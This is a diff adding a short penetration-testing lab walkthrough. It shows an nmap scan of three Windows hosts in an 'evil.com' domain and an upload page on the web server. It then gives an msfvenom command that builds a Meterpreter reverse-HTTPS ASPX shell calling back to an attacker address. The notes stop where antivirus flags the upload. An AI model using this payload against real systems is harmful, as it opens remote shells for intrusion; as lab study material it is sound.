@@ -1,0 +1,42 @@
+we'll scan the top 1000 ports with nmap:
+
+      sudo nmap -A -Pn 192.168.120.130-132
+        192.168.120.130
+        3389/tcp open  ms-wbt-server Microsoft Terminal Services
+        | rdp-ntlm-info: 
+        |   Target_Name: EVIL
+        |   NetBIOS_Domain_Name: EVIL
+        |   NetBIOS_Computer_Name: DC02
+        |   DNS_Domain_Name: evil.com
+        |   DNS_Computer_Name: dc02.evil.com
+
+        192.168.120.131
+        3389/tcp open  ms-wbt-server Microsoft Terminal Services
+        | rdp-ntlm-info: 
+        |   Target_Name: EVIL
+        |   NetBIOS_Domain_Name: EVIL
+        |   NetBIOS_Computer_Name: FILE01
+        |   DNS_Domain_Name: evil.com
+        |   DNS_Computer_Name: file01.evil.com
+
+        192.168.120.132
+        80/tcp   open  http          Microsoft IIS httpd 10.0
+        
+        3389/tcp open  ms-wbt-server Microsoft Terminal Services
+        | rdp-ntlm-info: 
+        |   Target_Name: EVIL
+        |   NetBIOS_Domain_Name: EVIL
+        |   NetBIOS_Computer_Name: WEB01
+        |   DNS_Domain_Name: evil.com
+        |   DNS_Computer_Name: web01.evil.com
+
+There is a web app on port 80 allowing file upload.
+http://192.168.231.132/upload/demo.aspx
+
+Create reverse shell payload using msfvenom:
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f aspx -o /home/kali/met.aspx
+
+Once we upload and browse the file we get error like unwanted software.
+
+
+        
